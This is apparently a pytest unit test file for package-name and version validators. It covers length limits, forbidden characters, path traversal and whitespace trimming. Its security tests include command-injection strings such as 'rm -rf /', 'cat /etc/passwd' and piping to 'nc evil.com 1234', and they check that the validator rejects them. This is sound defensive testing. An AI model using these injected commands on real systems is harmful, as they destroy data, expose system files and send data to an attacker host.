"""Unit tests for validation utilities."""
import pytest
from app.utils.validation import validate_package_name, validate_version, ValidationError


@pytest.mark.unit
class TestPackageNameValidation:
    """Tests for package name validation."""

    def test_valid_package_names(self):
        """Test that valid package names pass validation."""
        valid_names = [
            "requests",
            "django",
            "my-package",
            "my_package",
            "package123",
            "Package-Name_123",
            "a",  # Minimum length
            "a" * 214,  # Maximum length
        ]

        for name in valid_names:
            result = validate_package_name(name)
            assert result == name.strip()

    def test_empty_package_name(self):
        """Test that empty package name raises error."""
        with pytest.raises(ValidationError, match="cannot be empty"):
            validate_package_name("")

        with pytest.raises(ValidationError, match="cannot be empty"):
            validate_package_name("   ")

    def test_package_name_too_long(self):
        """Test that package names exceeding 214 chars raise error."""
        long_name = "a" * 215
        with pytest.raises(ValidationError, match="too long"):
            validate_package_name(long_name)

    def test_invalid_characters(self):
        """Test that invalid characters raise error."""
        invalid_names = [
            "my package",  # Space
            "my;package",  # Semicolon
            "my|package",  # Pipe
            "my&package",  # Ampersand
            "my$package",  # Dollar sign
            "my`package",  # Backtick
            "my(package)",  # Parentheses
            "my<package>",  # Angle brackets
            "my\\npackage",  # Newline
        ]

        for name in invalid_names:
            with pytest.raises(ValidationError):
                validate_package_name(name)

    def test_path_traversal_prevention(self):
        """Test that path traversal attempts are blocked."""
        with pytest.raises(ValidationError, match="\\.\\."):
            validate_package_name("../malicious")

        with pytest.raises(ValidationError, match="\\.\\."):
            validate_package_name("package..name")

    def test_starts_or_ends_with_special_chars(self):
        """Test that names starting/ending with special chars are invalid."""
        invalid_names = [
            "-package",
            "_package",
            ".package",
            "package-",
            "package_",
            "package.",
        ]

        for name in invalid_names:
            with pytest.raises(ValidationError):
                validate_package_name(name)

    def test_whitespace_trimming(self):
        """Test that whitespace is trimmed."""
        result = validate_package_name("  my-package  ")
        assert result == "my-package"


@pytest.mark.unit
class TestVersionValidation:
    """Tests for version validation."""

    def test_valid_versions(self):
        """Test that valid versions pass validation."""
        valid_versions = [
            "1.0.0",
            "2.1.3",
            "1.0.0a1",  # Alpha
            "1.0.0b2",  # Beta
            "1.0.0rc1",  # Release candidate
            "1.0.0-dev",  # Dev version
            "1.0.0+local",  # Local version
            "0.1",
            "1.2.3.4",
        ]

        for version in valid_versions:
            result = validate_version(version)
            assert result == version

    def test_none_version(self):
        """Test that None version is allowed."""
        result = validate_version(None)
        assert result is None

    def test_empty_version(self):
        """Test that empty version string returns None."""
        result = validate_version("")
        assert result is None

        result = validate_version("   ")
        assert result is None

    def test_version_too_long(self):
        """Test that versions exceeding 100 chars raise error."""
        long_version = "1." + "0." * 100
        with pytest.raises(ValidationError, match="too long"):
            validate_version(long_version)

    def test_invalid_version_characters(self):
        """Test that invalid characters in version raise error."""
        invalid_versions = [
            "1.0;0",  # Semicolon
            "1.0|0",  # Pipe
            "1.0&0",  # Ampersand
            "1.0$0",  # Dollar sign
            "1.0`0",  # Backtick
            "1.0(0)",  # Parentheses
            "1.0<0>",  # Angle brackets
        ]

        for version in invalid_versions:
            with pytest.raises(ValidationError):
                validate_version(version)

    def test_path_traversal_in_version(self):
        """Test that path traversal in version is blocked."""
        with pytest.raises(ValidationError, match="\\.\\."):
            validate_version("1.0..0")

        with pytest.raises(ValidationError, match="\\.\\."):
            validate_version("../1.0.0")

    def test_whitespace_trimming_in_version(self):
        """Test that whitespace is trimmed from version."""
        result = validate_version("  1.0.0  ")
        assert result == "1.0.0"


@pytest.mark.unit
class TestSecurityValidation:
    """Security-focused validation tests."""

    def test_command_injection_prevention_package_name(self):
        """Test that command injection attempts are blocked."""
        malicious_names = [
            "package; rm -rf /",
            "package && cat /etc/passwd",
            "package | nc evil.com 1234",
            "package$(whoami)",
            "package`ls`",
        ]

        for name in malicious_names:
            with pytest.raises(ValidationError):
                validate_package_name(name)

    def test_command_injection_prevention_version(self):
        """Test that command injection in version is blocked."""
        malicious_versions = [
            "1.0.0; rm -rf /",
            "1.0.0 && cat /etc/passwd",
            "1.0.0 | nc evil.com 1234",
            "1.0.0$(whoami)",
            "1.0.0`ls`",
        ]

        for version in malicious_versions:
            with pytest.raises(ValidationError):
                validate_version(version)

    def test_newline_injection_prevention(self):
        """Test that newline injection is prevented."""
        with pytest.raises(ValidationError):
            validate_package_name("package\\nmalicious")

        with pytest.raises(ValidationError):
            validate_version("1.0.0\\nmalicious")
